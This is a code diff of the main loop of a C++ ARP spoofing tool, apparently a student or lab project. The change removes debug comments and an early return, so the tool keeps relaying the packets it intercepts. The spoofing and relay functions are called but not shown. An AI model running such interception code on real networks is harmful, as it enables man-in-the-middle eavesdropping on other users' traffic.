@@ -49,17 +49,9 @@ int main(int argc, char* argv[]) {
 
 		idx++;
 	}
-
-	// pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
-	// if (handle == nullptr) {
-	// 	fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
-	// 	return -1;
-	// }
-	for(int i = 0; i < pair; i++){
-		
+	
+	for(int i = 0; i < pair; i++){		
 		arp_spoof_init(handle,i);
-
-		//printf("[*] send : %s target : %s\n", sender_ip[i], target_ip[i]);
 	}
 
 	int cnt = 0;
@@ -85,8 +77,7 @@ int main(int argc, char* argv[]) {
             break;
         }
 		EthHdr *eth_packet = (EthHdr*)pkt_data;
-		
-		//printf("idx : %d\n",i);
+
 		if(eth_packet -> type_ == htons(EthHdr::Arp)){
 			EthArpPacket *arp_packet = (EthArpPacket*)pkt_data;
 			printf("[*] arp found [sender IP = %s, target IP = %s]\n",std::string(Ip(htonl(arp_packet -> arp_.sip_))).c_str(),std::string(Ip(htonl(arp_packet -> arp_.tip_))).c_str());
@@ -111,26 +102,10 @@ int main(int argc, char* argv[]) {
 				if(ntohl(p_info->ipv4.ip_dst.s_addr) == (uint32_t)Ip(sender_ip[i])){
 					relay_packet(handle, p_info,i);
 					printf("relay\n");
-					return 0;
 				}
 			}
 			printf("------------------------\n");
-			
-			
-			// printf("%x\n",(uint32_t)Ip(sender_ip[i]));
-			// printf("%x\n",ntohl(p_info->ipv4.ip_src.s_addr));
-
-			
 		}
-		// if(cnt > 300){
-		// 	for(int i = 0; i < idx; i++){
-		// 		arp_spoof_init(handle, i);
-		// 	}
-		// 	cnt = 0;
-		// }
-		// cnt++;
-
-
 		
 	}
 
